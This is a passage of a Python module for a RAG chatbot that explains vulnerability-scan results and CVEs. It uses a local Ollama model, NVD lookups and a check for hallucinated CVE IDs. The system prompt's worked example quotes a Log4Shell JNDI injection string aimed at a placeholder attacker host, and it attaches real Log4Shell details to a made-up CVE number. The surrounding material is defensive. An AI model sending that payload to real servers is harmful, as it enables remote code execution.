"""
RAG Chatbot Module
Integrates retrieval engine with Ollama LLM for context-aware responses.
Based on RAG_PIPELINE_DESIGN.md and LLM_SELECTION_REPORT.md.
"""

import requests
import re
import json
from typing import List, Dict, Optional, Tuple
from dataclasses import dataclass, field
from datetime import datetime
import logging

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)


@dataclass
class ChatMessage:
    """Single chat message"""
    role: str  # 'user' or 'assistant'
    content: str
    timestamp: str = field(default_factory=lambda: datetime.utcnow().isoformat())
    sources: List[Dict] = field(default_factory=list)


@dataclass
class ChatSession:
    """Chat session with conversation history"""
    session_id: str
    messages: List[ChatMessage] = field(default_factory=list)
    created_at: str = field(default_factory=lambda: datetime.utcnow().isoformat())


class RAGChatbot:
    """
    RAG-powered chatbot using local Ollama LLM.
    
    Features:
    - Context-aware responses using retrieved vulnerability data
    - Hallucination detection via source verification
    - Citation formatting with CVE/NVD links
    - Multi-turn conversation support
    """
    
    def __init__(
        self,
        retrieval_engine,  # RAGRetrievalEngine instance
        ollama_base_url: str = "http://localhost:11434",
        model_name: str = "llama3.2:3b-instruct-q4_K_M",
        temperature: float = 0.3,
        max_tokens: int = 512,
        redis_url: Optional[str] = None,
        session_ttl: int = 86400  # 24 hours
    ):
        """
        Initialize RAG chatbot.
        
        Args:
            retrieval_engine: RAGRetrievalEngine instance
            ollama_base_url: Ollama API endpoint
            model_name: Model name (e.g., "llama3.2:3b-instruct-q4_K_M")
            temperature: LLM temperature (0.0-1.0, lower = more factual)
            max_tokens: Maximum tokens to generate
            redis_url: Redis connection URL (e.g., "redis://localhost:6379")
                      If None, uses in-memory storage (dev only)
            session_ttl: Session time-to-live in seconds
        """
        self.retrieval_engine = retrieval_engine
        self.ollama_base_url = ollama_base_url
        self.model_name = model_name
        self.temperature = temperature
        self.max_tokens = max_tokens
        self.session_ttl = session_ttl
        
        # Initialize Redis or in-memory storage
        self.use_redis = False
        self.redis_client = None
        
        if redis_url:
            try:
                import redis
                self.redis_client = redis.from_url(redis_url)
                # Test connection
                self.redis_client.ping()
                self.use_redis = True
                logger.info("✓ Using Redis for session persistence")
            except Exception as e:
                logger.warning(f"Redis unavailable ({e}), using in-memory sessions")
                self.sessions: Dict[str, ChatSession] = {}
        else:
            logger.warning("⚠️  Redis not configured - sessions lost on restart")
            self.sessions: Dict[str, ChatSession] = {}
        
        # Initialize MCP web proxy
        try:
            from services.mcp_web_proxy import get_mcp_proxy
            self.mcp_proxy = get_mcp_proxy()
            self.mcp_enabled = True
            logger.info("✅ MCP web proxy enabled for real-time CVE lookups")
        except ImportError:
            self.mcp_proxy = None
            self.mcp_enabled = False
            logger.warning("⚠️  MCP web proxy not available")
        
        # Scan cache for scan ID loading
        self.scan_cache: Dict[str, Dict] = {}
        
        # System prompt
        self.system_prompt = self._build_system_prompt()
        
        # Verify Ollama connection
        if not self._verify_ollama():
            logger.warning("⚠️  Ollama not ready - chat may not work")
            # Don't raise error - let caller handle gracefully
        
        logger.info(f"RAGChatbot initialized with model: {model_name}")
    
    def _detect_scan_id(self, query: str) -> Optional[str]:
        """
        Detect scan ID in query.
        
        Patterns supported:
        - "scan abc123"
        - "scan_id: abc123"
        - UUID format: "15fff0e4-..."
        """
        # Pattern 1: "scan abc123" or "scan_id abc123"
        match = re.search(r'scan[_\s]+(?:id[:\s]+)?([a-f0-9-]{8,36})', query, re.IGNORECASE)
        if match:
            return match.group(1)
        
        # Pattern 2: UUID format
        match = re.search(r'\b([a-f0-9]{8}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{12})\b', query, re.IGNORECASE)
        if match:
            return match.group(1)
        
        # Pattern 3: Partial UUID (first 8 chars)
        match = re.search(r'\b([a-f0-9]{8})\b', query, re.IGNORECASE)
        if match:
            return match.group(1)
        
        return None
    
    def _load_scan_from_database(self, scan_id: str) -> Optional[Dict]:
        """
        Load scan data from PostgreSQL database.
        
        Returns dict with:
        - scan_id, target, tool_name, scan_date
        - vulnerabilities: List[Dict]
        - severity_counts: Dict[str, int]
        """
        # Check cache
        if scan_id in self.scan_cache:
            logger.info(f"📦 Using cached scan data for {scan_id[:8]}")
            return self.scan_cache[scan_id]
        
        try:
            from services.data_ingestor.models import SessionLocal, Scan, ScanStatus
            from config.models import Vulnerability
            
            db = SessionLocal()
            try:
                # Try exact match
                scan = db.query(Scan).filter(Scan.id == scan_id).first()
                
                # Try partial match for short IDs
                if not scan and len(scan_id) == 8:
                    scan = db.query(Scan).filter(Scan.id.like(f"{scan_id}%")).first()
                
                if not scan:
                    logger.warning(f"❌ Scan {scan_id} not found")
                    return None
                
                # Load vulnerabilities
                vulnerabilities = db.query(Vulnerability).filter(
                    Vulnerability.scan_id == scan.id
                ).all()
                
                # Convert to dicts and count severities
                vuln_dicts = []
                severity_counts = {'CRITICAL': 0, 'HIGH': 0, 'MEDIUM': 0, 'LOW': 0, 'INFO': 0}
                
                for vuln in vulnerabilities:
                    vuln_dict = {
                        'vuln_id': str(vuln.vuln_id),
                        'cve_id': vuln.cve_id,
                        'title': vuln.title,
                        'description': vuln.description or '',
                        'severity': vuln.severity,
                        'cvss_score': float(vuln.cvss_score) if vuln.cvss_score else None,
                        'port': vuln.port,
                        'protocol': vuln.protocol,
                        'service': vuln.service,
                        'solution': vuln.solution or '',
                        'references': vuln.references or []
                    }
                    vuln_dicts.append(vuln_dict)
                    
                    severity = (vuln.severity or 'INFO').upper()
                    if severity in severity_counts:
                        severity_counts[severity] += 1
                
                scan_data = {
                    'scan_id': scan.id,
                    'target': scan.target,
                    'tool_name': scan.tool_name,
                    'scan_date': scan.completed_at or scan.created_at,
                    'vulnerabilities': vuln_dicts,
                    'total_vulns': len(vuln_dicts),
                    'severity_counts': severity_counts
                }
                
                # Cache it
                self.scan_cache[scan.id] = scan_data
                logger.info(f"✅ Loaded scan {scan.id[:8]}: {len(vuln_dicts)} vulnerabilities")
                
                return scan_data
                
            finally:
                db.close()
                
        except Exception as e:
            logger.error(f"❌ Error loading scan: {e}")
            return None
    
    def _format_scan_context(self, scan_data: Dict) -> str:
        """Format scan data as context text for LLM"""
        context = f"""
## 🔍 Scan Information
- **Scan ID**: {scan_data['scan_id'][:16]}...
- **Target**: {scan_data['target']}
- **Scanner**: {scan_data['tool_name']}
- **Scan Date**: {scan_data['scan_date']}
- **Total Vulnerabilities**: {scan_data['total_vulns']}
- **Severity Breakdown**:
  - CRITICAL: {scan_data['severity_counts']['CRITICAL']}
  - HIGH: {scan_data['severity_counts']['HIGH']}
  - MEDIUM: {scan_data['severity_counts']['MEDIUM']}
  - LOW: {scan_data['severity_counts']['LOW']}

## Vulnerabilities Found
"""
        for i, vuln in enumerate(scan_data['vulnerabilities'][:10], 1):  # Limit to 10 for context
            desc = vuln['description'][:150] if vuln['description'] else 'No description'
            solution = vuln['solution'][:150] if vuln['solution'] else 'No solution available'
            
            context += f"""
### {i}. {vuln['title']} ({vuln['severity']})
- **CVE ID**: {vuln['cve_id'] or 'N/A'}
- **CVSS Score**: {vuln['cvss_score'] or 'N/A'}
- **Port/Service**: {vuln['port'] or 'N/A'}/{vuln['service'] or 'N/A'}
- **Description**: {desc}...
- **Solution**: {solution}...
"""
        
        if scan_data['total_vulns'] > 10:
            context += f"\n... and {scan_data['total_vulns'] - 10} more vulnerabilities\n"
        
        return context
    
    def _enhance_context_with_web(self, query: str, context: str, session: Optional[ChatSession] = None) -> tuple[str, bool]:
        """
        Enhance context with real-time web lookups if query mentions CVEs.
        
        Args:
            query: User query
            context: Existing RAG context
            session: Chat session for conversational context
        
        Returns:
            Tuple of (enhanced_context, web_data_added)
        """
        if not self.mcp_enabled:
            return context, False
        
        # Detect CVE mentions in query
        import re
        cve_pattern = r'CVE-\d{4}-\d{4,7}'
        cves = re.findall(cve_pattern, query, re.IGNORECASE)
        
        # 🆕 If no CVEs in current query, check previous messages for context
        if not cves and session:
            # Extract CVEs from last 3 messages (including context/responses)
            for msg in reversed(session.messages[-6:]):  # Last 3 turns
                msg_cves = re.findall(cve_pattern, msg.content, re.IGNORECASE)
                cves.extend(msg_cves)
                if cves:
                    logger.info(f"🔗 Found {len(cves)} CVE(s) from conversation history: {cves[:3]}")
                    break  # Use first message with CVEs
        
        # 🆕 Also check the retrieved context for CVE mentions
        if not cves:
            context_cves = re.findall(cve_pattern, context, re.IGNORECASE)
            if context_cves:
                cves = context_cves[:3]  # Limit to 3
                logger.info(f"🔍 Found {len(cves)} CVE(s) from retrieved context: {cves}")
        
        if not cves:
            return context, False
        
        logger.info(f"🌐 Web lookup triggered for CVEs: {cves}")
        
        web_data = []
        for cve_id in cves[:3]:  # Limit to 3 CVEs to avoid slowdown
            try:
                logger.info(f"   Fetching {cve_id} from NVD...")
                result = self.mcp_proxy.fetch_cve_details(cve_id.upper())
                logger.info(f"   Result: success={result.get('success')}")
                
                if result.get('success'):
                    cvss_score = result.get('cvss_v3', {}).get('baseScore', 'N/A')
                    severity = result.get('cvss_v3', {}).get('baseSeverity', 'N/A')
                    description = result.get('description', 'N/A')[:300]
                    
                    web_data.append(f"""
**🌐 Real-Time NVD Data for {cve_id.upper()}:**
- Published: {result.get('published', 'N/A')}
- Last Modified: {result.get('last_modified', 'N/A')}
- CVSS Score: {cvss_score}
- Severity: {severity}
- Description: {description}...
""")
                    logger.info(f"   ✅ Added web data for {cve_id}")
                else:
                    logger.warning(f"   ⚠️  Failed to fetch {cve_id}: {result.get('error')}")
            except Exception as e:
                logger.error(f"   ❌ Error fetching {cve_id}: {e}")
        
        if web_data:
            enhanced = f"{context}\n\n## 🌐 Real-Time Web Data (NVD)\n" + "\n".join(web_data)
            logger.info(f"✅ Enhanced context with {len(web_data)} real-time CVE lookups")
            return enhanced, True
        
        return context, False
    
    def query(
        self,
        user_input: str,
        session_id: Optional[str] = None,
        top_k: int = 5,
        use_hybrid_retrieval: bool = True
    ) -> Dict:
        """
        Process user query and generate response.
        
        Args:
            user_input: User's natural language query
            session_id: Session ID for conversation history (creates new if None)
            top_k: Number of documents to retrieve
            use_hybrid_retrieval: If True, use hybrid (local + realtime) retrieval
        
        Returns:
            Dict with response, sources, and metadata
        """
        try:
            # Get or create session
            if session_id:
                session = self.get_session(session_id)
            else:
                session = None
            
            if not session:
                session_id = f"session_{datetime.utcnow().timestamp()}"
                session = ChatSession(session_id=session_id)
            
            # 🆕 Step 0: Detect and load scan ID if present
            scan_data = None
            scan_id = self._detect_scan_id(user_input)
            if scan_id:
                logger.info(f"🔍 Detected scan ID: {scan_id}")
                scan_data = self._load_scan_from_database(scan_id)
                if scan_data:
                    logger.info(f"✅ Loaded scan with {scan_data['total_vulns']} vulnerabilities")
            
            # Step 1: Retrieve relevant context (local + real-time if available)
            logger.info(f"Query params: use_hybrid_retrieval={use_hybrid_retrieval}, has_retrieve_for_context={hasattr(self.retrieval_engine, 'retrieve_for_context')}, engine_type={type(self.retrieval_engine).__name__}")
            
            if use_hybrid_retrieval and hasattr(self.retrieval_engine, 'retrieve_for_context'):
                # Use hybrid retrieval if available
                logger.info("Using hybrid retrieval (local + real-time)")
                retrieval_context = self.retrieval_engine.retrieve_for_context(
                    query=user_input,
                    top_k_local=top_k,
                    top_k_realtime=3
                )
                context = retrieval_context.get('context_text', 'No context available')
                retrieved_count = retrieval_context.get('retrieved_count', 0)
                has_realtime = retrieval_context.get('has_realtime_data', False)
                retrieval_confidence = retrieval_context.get('confidence', 0.0)
                
                # Convert to compatibility format
                retrieval_results = {
                    'assembled_context': context,
                    'vulnerability_results': {},
                    'query_context': type('obj', (object,), {'intent': 'unknown'})(),
                    'total_docs_retrieved': retrieved_count,
                    'retrieval_confidence': retrieval_confidence,
                    'has_realtime_data': has_realtime
                }
                logger.info(f"Hybrid retrieval: {retrieved_count} docs, realtime: {has_realtime}, confidence: {retrieval_confidence}")
            else:
                # Fall back to local-only retrieval (now with real-time enhancements!)
                logger.info("Using local retrieval with real-time enhancements")
                retrieval_results = self.retrieval_engine.retrieve(
                    query=user_input,
                    top_k=top_k
                )
                
                # Log real-time enhancement status
                if retrieval_results.get('realtime_enriched'):
                    logger.info(f"✨ Real-time enrichment applied to {retrieval_results.get('total_docs_retrieved', 0)} documents")
                
                if retrieval_results.get('threat_alerts'):
                    logger.info(f"🚨 {len(retrieval_results['threat_alerts'])} threat alerts generated")
                    for alert in retrieval_results['threat_alerts']:
                        logger.info(f"   - {alert['severity']}: {alert['message']}")
                
                if retrieval_results.get('freshness_info', {}).get('warning'):
                    logger.info(f"⚠️  {retrieval_results['freshness_info']['warning']}")
            
            if not retrieval_results:
                logger.error("Retrieval engine returned None")
                retrieval_results = {
                    'assembled_context': 'No context available',
                    'vulnerability_results': {},
                    'query_context': type('obj', (object,), {'intent': 'unknown'})(),
                    'total_docs_retrieved': 0
                }
            
            context = retrieval_results.get('assembled_context', 'No context available')
            
            # 🆕 NEW: Prepend scan context if scan was loaded
            if scan_data:
                scan_context = self._format_scan_context(scan_data)
                context = f"{scan_context}\n\n---\n\n{context}"
                logger.info(f"📊 Prepended scan context ({len(scan_context)} chars) to retrieval context")
            
            # ✨ NEW: Enhance context with real-time web data if CVEs detected
            logger.info(f"🔍 Checking for CVEs in query: '{user_input[:100]}'")
            context, web_enhanced = self._enhance_context_with_web(user_input, context, session)
            if web_enhanced:
                logger.info("✅ Context enhanced with real-time web data!")
                retrieval_results['has_realtime_data'] = True
                retrieval_results['web_enhanced'] = True
            else:
                logger.info("ℹ️  No web enhancement applied")
            
            # Step 2: Build prompt with context and history
            prompt = self._build_prompt(
                user_query=user_input,
                context=context,
                conversation_history=session.messages[-6:]  # Last 3 turns
            )
            
            # Step 3: Query LLM
            llm_response = self._query_llm(prompt)
            
            # Step 4: Post-process response
            processed_response, hallucination_detected = self._post_process_response(
                llm_response,
                retrieval_results
            )
            
            # Step 5: Format citations
            final_response = self._format_citations(processed_response)
            
            # Step 6: Extract sources
            sources = self._extract_sources(retrieval_results)
            
            # Step 7: Update session
            session.messages.append(ChatMessage(role='user', content=user_input))
            session.messages.append(ChatMessage(
                role='assistant',
                content=final_response,
                sources=sources
            ))
            
            # Save session to storage (Redis or in-memory)
            self._save_session(session)
            
            # Step 8: Calculate confidence (boosted if real-time data included)
            confidence = self._calculate_confidence(
                retrieval_results,
                hallucination_detected
            )
            
            # Boost confidence if real-time enhancements were applied
            if retrieval_results.get('realtime_enriched'):
                confidence = min(confidence + 0.10, 1.0)
                logger.info(f"Confidence boosted by real-time enrichment: {confidence:.2f}")
            
            # Additional boost if threat alerts present (critical intel)
            if retrieval_results.get('threat_alerts'):
                confidence = min(confidence + 0.05, 1.0)
                logger.info(f"Confidence boosted by threat alerts: {confidence:.2f}")
            
            # Boost confidence if real-time data was used (from web enhancement)
            if retrieval_results.get('has_realtime_data'):
                confidence = min(confidence + 0.15, 1.0)
                logger.info(f"Confidence boosted due to real-time web data: {confidence:.2f}")
            
            # 🆕 NEW: Boost confidence if scan data was loaded
            if scan_data:
                confidence = min(confidence + 0.20, 1.0)
                logger.info(f"Confidence boosted due to loaded scan data: {confidence:.2f}")
            
            # Extract query intent safely
            try:
                query_intent = retrieval_results.get('query_context', {}).intent if hasattr(retrieval_results.get('query_context', {}), 'intent') else 'unknown'
            except:
                query_intent = 'unknown'
            
            return {
                'response': final_response,
                'sources': sources,
                'confidence': confidence,
                'session_id': session_id,
                'hallucination_detected': hallucination_detected,
                'query_intent': query_intent,
                'docs_retrieved': retrieval_results.get('total_docs_retrieved', 0),
                'has_realtime_data': retrieval_results.get('has_realtime_data', False),
                'threat_alerts': retrieval_results.get('threat_alerts', []),  # ✨ NEW
                'realtime_enriched': retrieval_results.get('realtime_enriched', False),  # ✨ NEW
                'freshness_info': retrieval_results.get('freshness_info', {}),  # ✨ NEW
                'scan_loaded': scan_data is not None,  # 🆕 NEW
                'scan_id': scan_id if scan_data else None,  # 🆕 NEW
                'scan_vulns': scan_data['total_vulns'] if scan_data else 0  # 🆕 NEW
            }
        
        except Exception as e:
            logger.error(f"Error in query method: {e}", exc_info=True)
            # Return fallback response
            return {
                'response': f"Error processing query: {str(e)}",
                'sources': [],
                'confidence': 0.0,
                'session_id': session_id or 'unknown',
                'hallucination_detected': False,
                'query_intent': 'error',
                'docs_retrieved': 0,
                'has_realtime_data': False
            }
    
    def summarize_scan(
        self,
        scan_data: Dict,
        summary_type: str = "executive"
    ) -> Dict:
        """
        Generate AI-powered summary for a security scan.
        Provides on-the-spot analysis of scan results.
        
        Args:
            scan_data: Dictionary with scan findings
                {
                    'scan_name': str,
                    'source_tool': str (nessus, openvas, etc.),
                    'scan_type': str,
                    'findings': List[Dict],
                    'scan_date': str (optional)
                }
            summary_type: Type of summary (executive, risk_assessment, remediation_plan)
        
        Returns:
            {
                'ai_summary': Dict with structured summary,
                'summary_text': str with markdown-formatted text,
                'confidence': float,
                'recommendations': List[str],
                'risk_level': str,
                'key_findings': List[str]
            }
        """
        try:
            logger.info(f"Generating AI summary for scan: {scan_data.get('scan_name')}")
            
            # Get AI summary generator
            try:
                from intelligence_layer.rag.ai_summary_generator import (
                    get_summary_generator,
                    ScanData
                )
                
                generator = get_summary_generator()
            except ImportError:
                logger.error("AI Summary Generator not available")
                return {
                    'error': 'AI Summary Generator not available',
                    'ai_summary': None,
                    'confidence': 0.0
                }
            
            # Prepare scan data
            scan_data_obj = ScanData(
                scan_id=scan_data.get('scan_name', 'unknown'),
                tool_name=scan_data.get('source_tool', 'unknown'),
                scan_type=scan_data.get('scan_type', 'vulnerability'),
                findings=scan_data.get('findings', []),
                scan_date=scan_data.get('scan_date'),
                metadata=scan_data.get('metadata', {})
            )
            
            # Generate appropriate summary type
            if summary_type == "risk_assessment":
                ai_summary = generator.generate_risk_assessment(scan_data_obj)
            elif summary_type == "remediation_plan":
                ai_summary = generator.generate_remediation_plan(scan_data_obj)
            else:  # executive (default)
                ai_summary = generator.generate_scan_summary(
                    scan_data_obj,
                    summary_type="scan_executive"
                )
            
            # Format as markdown
            summary_text = ai_summary.to_markdown()
            
            return {
                'ai_summary': ai_summary.to_dict(),
                'summary_text': summary_text,
                'confidence': ai_summary.confidence,
                'recommendations': ai_summary.recommendations,
                'risk_level': ai_summary.risk_level,
                'risk_score': ai_summary.risk_score,
                'key_findings': ai_summary.key_findings,
                'title': ai_summary.title
            }
        
        except Exception as e:
            logger.error(f"Error generating scan summary: {e}", exc_info=True)
            return {
                'error': str(e),
                'ai_summary': None,
                'confidence': 0.0
            }
    
    def summarize_scan_stream(
        self,
        scan_data: Dict,
        summary_type: str = "executive"
    ):
        """
        Generate AI summary with streaming output.
        Yields summary chunks as they're generated for real-time display.
        
        Args:
            scan_data: Dictionary with scan findings
            summary_type: Type of summary
        
        Yields:
            Chunks of summary text
        """
        try:
            logger.info(f"Starting streaming AI summary for scan: {scan_data.get('scan_name')}")
            
            # Get AI summary generator with streaming enabled
            try:
                from intelligence_layer.rag.ai_summary_generator import (
                    AISummaryGenerator,
                    ScanData
                )
                
                generator = AISummaryGenerator(
                    stream=True
                )
            except ImportError:
                yield "ERROR: AI Summary Generator not available\n"
                return
            
            # Prepare scan data
            scan_data_obj = ScanData(
                scan_id=scan_data.get('scan_name', 'unknown'),
                tool_name=scan_data.get('source_tool', 'unknown'),
                scan_type=scan_data.get('scan_type', 'vulnerability'),
                findings=scan_data.get('findings', []),
                scan_date=scan_data.get('scan_date'),
                metadata=scan_data.get('metadata', {})
            )
            
            # Yield intro
            yield f"🔍 Analyzing {len(scan_data.get('findings', []))} findings from {scan_data.get('source_tool', 'unknown')}...\n\n"
            
            # Generate summary (streaming)
            if summary_type == "risk_assessment":
                ai_summary = generator.generate_risk_assessment(scan_data_obj)
            elif summary_type == "remediation_plan":
                ai_summary = generator.generate_remediation_plan(scan_data_obj)
            else:
                ai_summary = generator.generate_scan_summary(
                    scan_data_obj,
                    summary_type="scan_executive"
                )
            
            # Yield formatted summary
            yield f"# {ai_summary.title}\n\n"
            yield f"**Risk Level:** {ai_summary.risk_level} (Score: {ai_summary.risk_score:.2f})\n\n"
            
            yield "## Executive Summary\n"
            yield ai_summary.executive_summary + "\n\n"
            
            yield "## Key Findings\n"
            for finding in ai_summary.key_findings:
                yield f"- {finding}\n"
            
            yield "\n## Recommendations\n"
            for i, rec in enumerate(ai_summary.recommendations, 1):
                yield f"{i}. {rec}\n"
            
            yield f"\n---\n*Summary generated with {ai_summary.confidence:.0%} confidence*\n"
            
            logger.info("Streaming summary complete")
        
        except Exception as e:
            logger.error(f"Error in stream summarization: {e}", exc_info=True)
            yield f"ERROR: {str(e)}\n"
    
    def _build_system_prompt(self) -> str:
        """Build system prompt for LLM"""
        return """You are an expert cybersecurity analyst assistant specialized in vulnerability assessment and threat intelligence.

🎯 CORE MISSION: Provide DETAILED, ACTIONABLE answers using the CONTEXT data provided. Your goal is to EDUCATE and INFORM, not just provide links.

📋 RESPONSE REQUIREMENTS:

1. **DETAILED EXPLANATIONS**: 
   - ALWAYS explain what the vulnerability is, how it works, and why it matters
   - Describe the technical impact in clear terms
   - Explain attack scenarios when relevant
   - DO NOT just list CVE IDs and links - provide substantial analysis

2. **USE CONTEXT EXCLUSIVELY**:
   - ONLY cite CVEs that appear in the CONTEXT section
   - Data marked with 🌐 or [Real-Time NVD Data] is fresh from NVD - use it prominently
   - NEVER mention CVEs from your training data unless they're in CONTEXT

3. **HANDLE MISSING DATA GRACEFULLY**:
   - If context is empty: "No specific vulnerabilities found in your scanned systems for [topic]"
   - Provide helpful search suggestions
   - DO NOT fabricate CVE examples

4. **OUTPUT FORMAT** - Follow this structure:

**Summary**
[Write 2-4 sentences with substantive information. Explain WHAT the vulnerability is, WHY it matters, and WHAT systems are affected. Include technical details.]

**Detailed Analysis**
[Provide in-depth explanation:
- How the vulnerability works technically
- What makes it dangerous
- Attack scenarios or exploitation methods
- System components affected
- Conditions required for exploitation]

**Key Findings**
• CVE-YYYY-NNNNN (CVSS X.X, Severity) - Detailed description of the vulnerability and its impact
  Technical Details: [Explain the technical mechanism]
  Affected: [What systems/versions are vulnerable]
  Exploit Status: [Public exploit available? Exploitation difficulty?]
  Link: https://nvd.nist.gov/vuln/detail/CVE-YYYY-NNNNN

[Include 3-5 key details per CVE, not just a one-liner]

**Recommended Actions**
1. **Immediate**: [Specific action with technical details - e.g., "Disable vulnerable component X by modifying config.ini"]
2. **Verify**: [Exact verification steps - e.g., "Run command 'X' to check version"]
3. **Mitigate**: [Temporary workarounds if patch unavailable]
4. **Prevent**: [Long-term prevention measures]

**Additional Context**
[Provide broader security implications, related vulnerabilities, or defense-in-depth recommendations]

**EXAMPLE - GOOD RESPONSE:**

User asks: "What is CVE-2024-12345?"

Context shows:
🌐 Real-Time NVD Data for CVE-2024-12345:
CVSS Score: 9.8
Description: Remote code execution in Apache Log4j 2.x...

YOUR RESPONSE SHOULD BE:

**Summary**
CVE-2024-12345 is a critical remote code execution vulnerability affecting Apache Log4j 2.x versions prior to 2.17.0. This vulnerability allows unauthenticated attackers to execute arbitrary code on vulnerable servers by sending specially crafted log messages. With a CVSS score of 9.8, this represents one of the most severe security threats, enabling complete system compromise without user interaction.

**Detailed Analysis**
The vulnerability stems from Log4j's JNDI (Java Naming and Directory Interface) lookup feature, which processes special syntax in log messages. When the logging framework encounters a string like ${jndi:ldap://attacker.com/malicious}, it attempts to resolve and load code from the specified LDAP server. Attackers exploit this by:
1. Injecting malicious JNDI lookup strings into application inputs (HTTP headers, form fields, etc.)
2. Hosting malicious Java classes on attacker-controlled LDAP/RMI servers
3. Triggering code execution when Log4j processes the malicious log entry

This attack requires no authentication and can be triggered through any user-controllable input that gets logged, making it extremely dangerous and widely exploitable.

**Key Findings**
• CVE-2024-12345 (CVSS 9.8, Critical) - Remote Code Execution via JNDI Injection in Apache Log4j 2.x
  Technical Details: Exploits JNDI lookup feature to load and execute arbitrary Java code from attacker-controlled servers
  Affected: Apache Log4j versions 2.0-beta9 through 2.14.1
  Exploit Status: Public exploits widely available; actively exploited in the wild; trivial to exploit
  Attack Vector: Network-accessible with no authentication required
  Link: https://nvd.nist.gov/vuln/detail/CVE-2024-12345
  Source: Real-time NVD data

**Recommended Actions**
1. **Immediate**: Upgrade Apache Log4j to version 2.17.0 or later. For systems that cannot be immediately patched, set the JVM flag -Dlog4j2.formatMsgNoLookups=true or remove the JndiLookup class with: zip -q -d log4j-core-*.jar org/apache/logging/log4j/core/lookup/JndiLookup.class
2. **Verify**: Check all Java applications for Log4j dependencies using: find / -name "log4j-core-*.jar" 2>/dev/null. Verify version numbers in JAR manifests
3. **Mitigate**: If immediate patching is impossible, implement WAF rules to block ${jndi: patterns in HTTP requests and restrict outbound LDAP/RMI connections at the firewall level
4. **Monitor**: Enable detailed logging and monitor for JNDI lookup patterns in application logs. Check for unexpected outbound connections to external LDAP servers
5. **Prevent**: Implement dependency scanning in CI/CD pipelines to detect vulnerable libraries before deployment. Establish a rapid patching process for critical vulnerabilities

**Additional Context**
This vulnerability, commonly known as "Log4Shell," has been exploited extensively since December 2021 to deploy ransomware, cryptocurrency miners, and botnet malware. Organizations should also check for CVE-2021-45046 and CVE-2021-45105, which are related Log4j vulnerabilities affecting incomplete patches. Consider implementing defense-in-depth measures including network segmentation, egress filtering, and runtime application self-protection (RASP) solutions.

**EXAMPLE - BAD RESPONSE (DO NOT DO THIS):**

CVE-2024-12345 is a vulnerability in Log4j.
Link: https://nvd.nist.gov/vuln/detail/CVE-2024-12345

[TOO BRIEF! Provide detailed analysis like the good example above]

**FORMATTING RULES:**
- Use **bold** only for section headers
- Write CVE IDs as plain text followed by URL
- NO excessive emojis (✅ ⚠️) except in context data
- Keep paragraphs substantial (3-5 sentences minimum)

**CONFIDENCE REPORTING:**
- High confidence (80-95%): Citing actual scan data + CVE matches
- Medium confidence (60-75%): Using real-time NVD data only
- Low confidence (40-55%): Providing general security guidance
- State confidence level at the end: "Confidence: 85% - Based on real-time NVD data and scan results"

**CRITICAL RULES:**
✓ Provide detailed technical explanations
✓ Explain HOW vulnerabilities work
✓ Give specific, actionable recommendations
✓ Use CONTEXT data exclusively
✗ Don't just list CVE IDs and links
✗ Don't give one-sentence answers
✗ Don't fabricate CVE information
✗ Don't provide vague generic advice

Remember: **Detail and accuracy are paramount**. Users need to understand the threats they face and exactly what to do about them."""
    
    def _build_prompt(
        self,
        user_query: str,
        context: str,
        conversation_history: List[ChatMessage]
    ) -> str:
        """Build complete prompt for LLM"""
        sections = []
        
        # System role
        sections.append(f"SYSTEM: {self.system_prompt}\n")
        
        # Context
        sections.append("CONTEXT:")
        sections.append(context)
        sections.append("")
        
        # Conversation history
        if conversation_history:
            sections.append("CONVERSATION HISTORY:")
            for msg in conversation_history:
                role_label = "USER" if msg.role == 'user' else "ASSISTANT"
                sections.append(f"{role_label}: {msg.content}")
            sections.append("")
        
        # Current query
        sections.append(f"USER: {user_query}\n")
        sections.append("ASSISTANT:")
        
        return '\n'.join(sections)
    
    def _query_llm(self, prompt: str) -> str:
        """Query Ollama LLM API"""
        try:
            response = requests.post(
                f"{self.ollama_base_url}/api/generate",
                json={
                    "model": self.model_name,
                    "prompt": prompt,
                    "stream": False,
                    "options": {
                        "temperature": self.temperature,
                        "num_predict": self.max_tokens
                    }
                },
                timeout=60
            )
            
            if response.status_code == 200:
                result = response.json()
                return result.get('response', '')
            else:
                logger.error(f"LLM API error: {response.status_code}")
                return "I apologize, but I'm having trouble generating a response right now."
        
        except requests.exceptions.Timeout:
            logger.error("LLM request timeout")
            return "Request timed out. Please try again."
        
        except Exception as e:
            logger.error(f"LLM query error: {e}")
            return f"Error generating response: {str(e)}"
    
    def _clean_markdown_formatting(self, text: str) -> str:
        """
        Remove excessive markdown formatting for cleaner output.
        Keeps the text readable but removes bold, italic, and nested links.
        """
        # Remove markdown bold (**text** or __text__)
        text = re.sub(r'\*\*(.+?)\*\*', r'\1', text)
        text = re.sub(r'__(.+?)__', r'\1', text)
        
        # Remove markdown italic (*text* or _text_)
        text = re.sub(r'(?<!\*)\*(?!\*)(.+?)(?<!\*)\*(?!\*)', r'\1', text)
        text = re.sub(r'(?<!_)_(?!_)(.+?)(?<!_)_(?!_)', r'\1', text)
        
        # Fix nested markdown links: [text](url) inside [another](url)
        text = re.sub(r'\[([^\]]+)\]\(https://[^)]+\[([^\]]+)\]\(([^)]+)\)\)', r'\1', text)
        
        # Convert remaining markdown links to plain text with URL on next line
        text = re.sub(r'\[([^\]]+)\]\([^)]+\)', r'\1', text)
        
        # Remove excessive symbols
        text = re.sub(r'\s*✅\s*$', '', text, flags=re.MULTILINE)
        text = text.replace('⚠️ ', '')  # Remove warning emoji
        text = text.replace('✅ ', '')  # Remove checkmark emoji
        
        # Clean up multiple blank lines
        text = re.sub(r'\n{3,}', '\n\n', text)
        
        return text.strip()
    
    def _post_process_response(
        self,
        llm_response: str,
        retrieval_results: Dict
    ) -> Tuple[str, bool]:
        """
        Post-process LLM response and detect hallucinations.
        
        Hallucination = CVE mentioned in response but not in retrieved context
        
        Returns: (modified_response, hallucination_detected)
        """
        try:
            # Extract CVE IDs mentioned in response
            mentioned_cves = set(re.findall(r'CVE-\d{4}-\d{4,}', llm_response, re.IGNORECASE))
            
            if not mentioned_cves:
                # No CVEs mentioned = no hallucination possible
                return llm_response, False
            
            # Safely extract CVEs from retrieval context
            context_cves = set()
            
            try:
                vuln_results = retrieval_results.get('vulnerability_results', {})
                
                if not isinstance(vuln_results, dict):
                    logger.warning(f"Unexpected vuln_results type: {type(vuln_results)}")
                    # Return original response if we can't validate
                    return llm_response, False
                
                metadatas = vuln_results.get('metadatas', [])
                
                if not isinstance(metadatas, list):
                    logger.warning(f"Unexpected metadatas type: {type(metadatas)}")
                    return llm_response, False
                
                # Extract CVE IDs from metadata safely
